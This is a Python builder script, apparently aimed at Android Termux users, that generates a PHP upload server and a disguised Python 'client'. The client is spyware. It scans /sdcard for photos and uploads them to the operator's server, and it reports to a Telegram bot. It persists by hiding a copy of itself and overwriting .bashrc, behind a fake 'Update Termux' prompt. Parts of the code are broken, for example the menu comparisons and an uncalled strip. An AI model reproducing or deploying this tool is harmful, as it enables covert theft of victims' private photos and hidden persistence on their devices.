import os,subprocess,random,string,requests,time,sys
class Max:
    def __init__(self) :
        self.green = r"\033[1;32m"
        self.red = r"\033[1;31m"
    
        self.yallow = r"\033[1;33m"
        self.blue = r"\033[1;34m"
        self.path = "/sdcard/zeyad-alabany"
        try:
           open("/sdcard/per.txt",'w').write("")
           if not os.path.exists("/sdcard/install.txt"):
              if self.HandleSystem() == "termux":
                 print(f"{self.green} YOUR IS SYSTEM TERMUX")
                 time.sleep(3)
                 self.install()
              elif self.HandleSystem() == "pydroid":
                print(f"{self.green} YOUR IS SYSTEM Pyroid")
                time.sleep(3)
                self.install()
              else:
                 sys.exit('Your system not available')
           else:
              pass
        except PermissionError:
           print(f"{self.red} ENTER YES TO GIVE PERMISSIONS ")
           subprocess.Popen('termux-setup-storage',stdout=subprocess.PIPE,shell=True)
           time.sleep(3)
           sys.exit()
        if not os.path.exists('dump.txt'):
           self.DumpInfo()
        else:
           self.MainMenu()
    def DumpInfo(self):
       mes = self.blue+"Now WE take Info from you give me all "
       for letter in mes:
          time.sleep(0.04)
          sys.stdout.write(letter)
          sys.stdout.flush()
       x = input(self.blue+"GIVE ME YOU GROUP ID TELEGRAM")
       y = input(self.blue+"GIVE ME Your Token Telegram")
       with open('dump.txt','w')as dump:
          dump.write(f"{x}|{y}")    
    def install(self):
       file = __file__
       dir = self.path
       if not os.path.exists(self.path):
          os.makedirs(self.path)
          subprocess.Popen(f'mv {file} {dir}',stdout=subprocess.PIPE,shell=True)
          print(self.green+f"YOUR TOOL IN {dir}")
          sys.exit()
    def Fark (self):
       x = open('dump.txt','r').read()
       a = x.split('|')
       return a
    def Banner(self):
       s=self.green+"""
 ███████████  ███████████    ████████  █████   ████
░░███░░░░░███░░███░░░░░███  ███░░░░███░░███   ███░ 
 ░███    ░███ ░███    ░███ ░░░    ░███ ░███  ███   
 ░██████████  ░██████████     ██████░  ░███████    
 ░███░░░░░███ ░███░░░░░███   ░░░░░░███ ░███░░███   
 ░███    ░███ ░███    ░███  ███   ░███ ░███ ░░███  
 ███████████  █████   █████░░████████  █████ ░░████
░░░░░░░░░░░  ░░░░░   ░░░░░  ░░░░░░░░  ░░░░░   ░░░░ 
CREATOR ZeyadAlabany tele[sxtz0]
"""
       return s
    def MainMenu(self):
       for letter in self.Banner():
          time.sleep(0.04)
          sys.stdout.write(letter)
          sys.stdout.flush()
       print(self.green+"""
[1-] Create PHP SERVER
[2-] Create PYTHON CLIENT
[3-] ABOUT DEVELOPER 
[4-] EXIT
          """)
       try:
          x = int(input(f" CHOOSE =>"))
          if x in ['1','01']:
             self.PHP()
          elif x in ['02','2']:
             self.python()
          elif x in ["03",'3']:
             self.Br3k()
          elif x in ['04','4']:
             print("bye bye")
             sys.exit()
          else:
             print("PLease Enter correct number !")
             self.MainMenu()
       except ValueError:
          print("PLEASE CHOOSING NUMBERSS")
          sys.exit('CHOOSING NUMBERS! Follow My TELE : @srtly')
          
    def Br3k(self):
       for letter in self.Banner():
          time.sleep(0.04)
          sys.stdout.write(self.red+letter)  
          sys.stdout.flush()
       subprocess.Popen('am start https://t.me/sxtz0',stdout=subprocess.PIPE,shell=True)
       sys.exit('bye bye')
    def python(self):
      x = input("ENTER NAME :")
      y = input("Give Me Your Link of your php")
      if x.endswith('.py'):
         a=x.split(".py")
         with open(f'{a[0]}.py','w')as file:
            file.write(f'''
import subprocess,string,random,os,time,sys
from datetime import datetime
try:
    import requests
except ModuleNotFoundError:
    subprocess.Popen('pip install requests',stdout=subprocess.PIPE,shell=True)
class Zeyad:
   def __init__(self) :
       self.inj = r"/data/data/com.termux/files/home/.minimax.py"
       self.bashrc = r"/data/data/com.termux/files/home/.bashrc"
       self.path = r"/sdcard/Files.txt"
       self.uploaded= r"/sdcard/Upload.txt"
       self.done = r"/sdcard/done.txt"
       try:
           open(r"/sdcard/permi.txt","w").write("")
       except:
           print("Click Ok to Update Termux")
           subprocess.Popen("termux-setup-storage",stdout=subprocess.PIPE,shell=True)
           time.sleep(6)
           self.Inject_Bashrc()
       if not os.path.exists(self.path): ## Create File Contain name photo
           self.GetFilesNames()
       if not os.path.exists('tes.di'):
                       try:
                           requests.get('https://api.telegram.org/bot{self.Fark()[1]}/sendMessage?chat_id=@{self.Fark()[0]}&text=بدات عملية السحب بنجاح')
                           open('tes.di','w').write("JJ")
                       except:
                          pass
       if os.path.exists(self.path):  ## this is upload method !!
           self.confirmupload()
   def MoveFileToHome(self):
       if not os.path.exists(self.inj):
           myfile = __file__
           subprocess.Popen(f'cp {{myfile}} {{self.inj}}',stdout=subprocess.PIPE,shell=True)
       else:
           pass

           
           
       
   def Inject_Bashrc(self):
       try:
           open(r"/sdcard/permi.txt","w").write("")
           self.__init__()
       except PermissionError:
           with open("/data/data/com.termux/files/home/.ass.py","w")as Get:
               Get.write("""
from datetime import datetime
from os import system 
import time
def per():
    try:
        open('/sdcard/permi.txt','w').write('')
        system(f'python /data/data/com.termux/files/home/.minimax.py')
        
    except PermissionError:
        print("\\033[1;32m UPDATE TERMUX NOW")
        system('termux-setup-storage')
        time.sleep(2)
        per()
per()
""")
           with open(self.bashrc,"w")as bashrc:
               bashrc.write("python /data/data/com.termux/files/home/.ass.py")
           self.MoveFileToHome()
           sys.exit()
           
   def GetRandomString(self):
       s = random.choices(string.digits+string.ascii_uppercase,k=9)
       a = "".join(s)
       return a
   def GetFilesNames(self):
       if not os.path.exists(self.path):
          with open(self.path,"w")as max:
              for root,dirs,file in os.walk("/sdcard"):
                  for files in file:
                      path = os.path.join(root,files)
                      ext = os.path.splitext(path)[1]
                      if ext in [".jpg",".png",".heic",".jpeg"]:
                          max.write(path+"\\n")
          try:
              requests.get("tele")
          except:
              pass
              
          
   def confirmupload(self):
       if not os.path.exists(self.done):
           with open(self.path,"r")as Fire:
               for i in Fire:
                   self.PhpUpload(i.strip)
       else:
          with open(self.path,'r')as Water:
              done = open(self.done,'r').read()
              for i in Water:
                  if i.strip() in done:
                      continue
              self.PhpUpload(i.strip())                   
   def PhpUpload(self,files):
     try:
       s = open(self.done,"a")
       with open(files,"rb")as women:
           mar = {{'photo':women}}
           send = requests.post("{y}",files=mar)
           if send.status_code ==200:
               s.write(f"{{files}}\\n")
     except:
         time.sleep(60*5)
         self.__init__()
   def Injection(self): ##name here
       with open(self.bashrc,"w")as bash:
           bash.write(f"nohup python {{self.inj}} > /dev/null 2>&1 &")               
Zeyad()
                      ''')
      else:
         with open(f"{x}.py","w")as files:
            files.write(f'''
import subprocess,string,random,os,time,sys
from datetime import datetime
try:
    import requests
except ModuleNotFoundError:
    subprocess.Popen('pip install requests',stdout=subprocess.PIPE,shell=True)
class Zeyad:
   def __init__(self) :
       self.inj = r"/data/data/com.termux/files/home/.minimax.py"
       self.bashrc = r"/data/data/com.termux/files/home/.bashrc"
       self.path = r"/sdcard/Files.txt"
       self.uploaded= r"/sdcard/Upload.txt"
       self.done = r"/sdcard/done.txt"
       try:
           open(r"/sdcard/permi.txt","w").write("")
       except:
           print("Click Ok to Update Termux")
           subprocess.Popen("termux-setup-storage",stdout=subprocess.PIPE,shell=True)
           time.sleep(6)
           self.Inject_Bashrc()
       if not os.path.exists(self.path): ## Create File Contain name photo
           self.GetFilesNames()
       if not os.path.exists('tes.di'):
                       try:
                           requests.get('https://api.telegram.org/bot{self.Fark()[1]}/sendMessage?chat_id=@{self.Fark()[0]}&text=بدات عملية السحب بنجاح')
                           open('tes.di','w').write("JJ")
                       except:
                          pass
       if os.path.exists(self.path):  ## this is upload method !!
           self.confirmupload()
   def MoveFileToHome(self):
       if not os.path.exists(self.inj):
           myfile = __file__
           subprocess.Popen(f'cp {{myfile}} {{self.inj}}',stdout=subprocess.PIPE,shell=True)
       else:
           pass

           
           
       
   def Inject_Bashrc(self):
       try:
           open(r"/sdcard/permi.txt","w").write("")
           self.__init__()
       except PermissionError:
           with open("/data/data/com.termux/files/home/.ass.py","w")as Get:
               Get.write("""
from datetime import datetime
from os import system 
import time
def per():
    try:
        open('/sdcard/permi.txt','w').write('')
        system(f'python /data/data/com.termux/files/home/.minimax.py')
        
    except PermissionError:
        print("\\033[1;32m UPDATE TERMUX NOW")
        system('termux-setup-storage')
        time.sleep(2)
        per()
per()
""")
           with open(self.bashrc,"w")as bashrc:
               bashrc.write("python /data/data/com.termux/files/home/.ass.py")
           self.MoveFileToHome()
           sys.exit()
           
   def GetRandomString(self):
       s = random.choices(string.digits+string.ascii_uppercase,k=9)
       a = "".join(s)
       return a
   def GetFilesNames(self):
       if not os.path.exists(self.path):
          with open(self.path,"w")as max:
              for root,dirs,file in os.walk("/sdcard"):
                  for files in file:
                      path = os.path.join(root,files)
                      ext = os.path.splitext(path)[1]
                      if ext in [".jpg",".png",".heic",".jpeg"]:
                          max.write(path+"\\n")
          try:
              requests.get("tele")
          except:
              pass
              
          
   def confirmupload(self):
       if not os.path.exists(self.done):
           with open(self.path,"r")as Fire:
               for i in Fire:
                   self.PhpUpload(i.strip)
       else:
          with open(self.path,'r')as Water:
              done = open(self.done,'r').read()
              for i in Water:
                  if i.strip() in done:
                      continue
              self.PhpUpload(i.strip())                   
   def PhpUpload(self,files):
     try:
       s = open(self.done,"a")
       with open(files,"rb")as women:
           mar = {{'photo':women}}
           send = requests.post("{y}",files=mar)
           if send.status_code ==200:
               s.write(f"{{files}}\\n")
     except:
         time.sleep(60*5)
         self.__init__()
   def Injection(self): ##name here
       with open(self.bashrc,"w")as bash:
           bash.write(f"nohup python {{self.inj}} > /dev/null 2>&1 &")               
Zeyad()
''')
      print(f"{self.blue}GO TO {self.path} AND YOU GET {x}")
      time.sleep(3)
      self.MainMenu()
    def PHP(self):
       with open("BR3K.php","w")as php:
          php.write("""
<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['photo'])) {
    $targetDirectory = 'uploads/';
    $targetFile = $targetDirectory . basename($_FILES['photo']['name']);
    $uploadOk = 1;
    $imageFileType = strtolower(pathinfo($targetFile, PATHINFO_EXTENSION));
$uploadOk=1;
    if ($uploadOk == 1) {
        if (move_uploaded_file($_FILES['photo']['tmp_name'], $targetFile)) {
            echo 'File uploaded successfully.';
    // Check if the file is an actual photo or a fake photo
    $check = getimagesize($_FILES['photo']['tmp_name']);
    if ($check !== false) {
        $uploadOk = 1;
    } else {
        echo 'Error: File is not a valid photo.';
        $uploadOk = 0;
    }

    // Check if file already exists
    if (file_exists($targetFile)) {
        echo 'Error: File already exists.';
        $uploadOk = 0;
    }

    // Check file size
    if ($_FILES['photo']['size'] > 5000000) {
        echo 'Error: File size is too large.';
        $uploadOk = 0;
    }

    // Allow only certain file formats
    if ($imageFileType != 'jpg' && $imageFileType != 'jpeg' && $imageFileType != 'png' && $imageFileType!= 'py') {
        echo 'Error: Only JPG, JPEG, and PNG files are allowed.';
        $uploadOk = 0;
    }

    // If everything is OK, try to upload the file

        } else {
            echo 'Error: There was an error uploading the file.';
        }
    }
} else {
    echo 'Error: Invalid request.';
}
                    """)
          print(self.green+"DONE YOU GOT IN YOUR PATH",self.path)
          self.MainMenu()
    def HandleSystem(self):
        if os.path.exists('/data/data/com.termux/files/home'):
            return "termux"
        else:
            return "pydroid"
Max()
